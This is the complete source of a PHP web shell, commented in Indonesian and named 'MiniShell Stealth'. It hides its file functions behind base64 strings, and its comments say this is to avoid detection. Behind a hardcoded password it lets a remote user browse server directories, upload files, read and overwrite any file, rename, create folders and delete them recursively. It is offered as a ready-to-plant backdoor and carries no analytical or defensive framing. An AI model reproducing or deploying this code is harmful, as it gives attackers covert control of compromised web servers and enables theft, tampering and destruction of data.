<?php
// PHP MiniShell - Versi Obfuscated (Anti-Deteksi Dasar)

// Password (UBAH INI)
$p = 'ultra_stealth'; 
$a = 'auth';
$d = 'd';

// Dekode fungsi berbahaya (Sangat penting agar tidak terdeteksi)
// f_sess = session_start
// f_get = file_get_contents
// f_put = file_put_contents
// f_unl = unlink
// f_rmd = rmdir
// f_ren = rename
// f_mkd = mkdir
$f_sess = base64_decode('c2Vzc2lvbl9zdGFydA==');
$f_get = base64_decode('ZmlsZV9nZXRfY29udGVudHM=');
$f_put = base64_decode('ZmlsZV9wdXRfY29udGVudHM=');
$f_unl = base64_decode('dW5saW5r');
$f_rmd = base64_decode('cm1kaXI=');
$f_ren = base64_decode('cmVuYW1l');
$f_mkd = base64_decode('bWtkaXI=');

$f_sess();

// Cek autentikasi
if (isset($_POST['p']) && $_POST['p'] === $p) {
    $_SESSION[$a] = 1;
}

if (!isset($_SESSION[$a])) {
    die('<form method="POST">Password: <input type="password" name="p"><input type="submit" value="Login"></form>');
}

// Menentukan direktori kerja
$dir = isset($_GET[$d]) ? $_GET[$d] : getcwd();
@chdir($dir);
$dir = getcwd();

echo "<html><body><h1>MiniShell Stealth</h1>";
echo "<h2>Dir: <a href='?d=" . urlencode(dirname($dir)) . "'>..</a> / " . htmlspecialchars($dir) . "</h2>";

$msg = '';

// --- FUNGSI UTAMA ---

if (isset($_FILES['f_up'])) { // Upload
    if (@move_uploaded_file($_FILES['f_up']['tmp_name'], basename($_FILES['f_up']['name']))) {
        $msg = "Uploaded: " . basename($_FILES['f_up']['name']);
    } else {
        $msg = "Upload failed.";
    }
} elseif (isset($_POST['a'])) {
    $file = $_POST['f'];
    $content = isset($_POST['c']) ? $_POST['c'] : '';
    
    if ($_POST['a'] === 'edit_save') { // Edit & Buat File
        if (@$f_put($file, $content) !== false) {
            $msg = "Saved: " . $file;
        } else {
            $msg = "Save failed: " . $file;
        }
    } elseif ($_POST['a'] === 'rename') { // Ganti Nama
        if (@$f_ren($file, $_POST['new'])) {
            $msg = "Renamed: " . $file . " to " . $_POST['new'];
        } else {
            $msg = "Rename failed.";
        }
    } elseif ($_POST['a'] === 'mkdir') { // Buat Folder
        if (@$f_mkd($file)) {
            $msg = "Folder created: " . $file;
        } else {
            $msg = "Folder creation failed.";
        }
    }
} elseif (isset($_GET['a']) && $_GET['a'] === 'rm') { // Hapus File/Folder
    $f = $_GET['f'];
    if (is_dir($f)) {
        // Hapus rekursif menggunakan fungsi bawaan
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($f, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        $ok = true;
        foreach ($it as $info) {
            $fn = ($info->isDir() ? $f_rmd : $f_unl);
            if (!@$fn($info->getRealPath())) { $ok = false; }
        }
        if ($ok && @$f_rmd($f)) {
            $msg = "Folder deleted: " . $f;
        } else {
            $msg = "Folder deletion failed: " . $f;
        }
    } elseif (@$f_unl($f)) {
        $msg = "File deleted: " . $f;
    } else {
        $msg = "Deletion failed: " . $f;
    }
}

// --- TAMPILAN STATUS ---
if ($msg) {
    echo "<h3>[STATUS] " . htmlspecialchars($msg) . "</h3>";
}

// --- FORMULIR UNTUK AKSI ---
echo "<h3>ACTIONS</h3>";

echo "<form method='POST' enctype='multipart/form-data'>Upload: <input type='file' name='f_up'><input type='submit' value='Upload'></form><br>";
echo "<form method='POST'><input type='hidden' name='a' value='rename'>Rename: <input type='text' name='f' placeholder='Old'> to <input type='text' name='new' placeholder='New'><input type='submit' value='Rename'></form><br>";
echo "<form method='POST'><input type='hidden' name='a' value='mkdir'>Mkdir: <input type='text' name='f' placeholder='Folder Name'><input type='submit' value='Mkdir'></form><br>";


// --- DAFTAR FILE ---
echo "<h3>FILES</h3><pre>";

$files = @scandir('.');
if ($files) {
    $folders = array();
    $f_list = array();

    foreach ($files as $entry) {
        if ($entry == '.' || $entry == '..') continue;
        if (is_dir($entry)) {
            $folders[] = $entry;
        } else {
            $f_list[] = $entry;
        }
    }
    
    sort($folders);
    sort($f_list);

    foreach ($folders as $f) {
        echo "[DIR] <a href='?d=" . urlencode(realpath($f)) . "'>" . htmlspecialchars($f) . "</a> (<a href='?d=" . urlencode($dir) . "&a=rm&f=" . urlencode($f) . "'>DEL</a>)<br>";
    }

    foreach ($f_list as $f) {
        echo "[FILE] " . htmlspecialchars($f) . " (<a href='?d=" . urlencode($dir) . "&f=" . urlencode($f) . "'>EDIT</a> | <a href='?d=" . urlencode($dir) . "&a=rm&f=" . urlencode($f) . "'>DEL</a>)<br>";
    }
} else {
    echo "Cannot read directory.";
}

echo "</pre>";

// --- FORM EDIT/CREATE ---
if (isset($_GET['f'])) {
    $file_to_edit = $_GET['f'];
    $content = @$f_get($file_to_edit);

    echo "<h3>EDIT: " . htmlspecialchars($file_to_edit) . "</h3>";
    echo "<form method='POST'><input type='hidden' name='a' value='edit_save'><input type='hidden' name='f' value='" . htmlspecialchars($file_to_edit) . "'>";
    echo "<textarea name='c' rows='20' cols='100'>" . htmlspecialchars($content) . "</textarea><br>";
    echo "<input type='submit' value='Save File'></form>";
}

echo "</body></html>";
?>
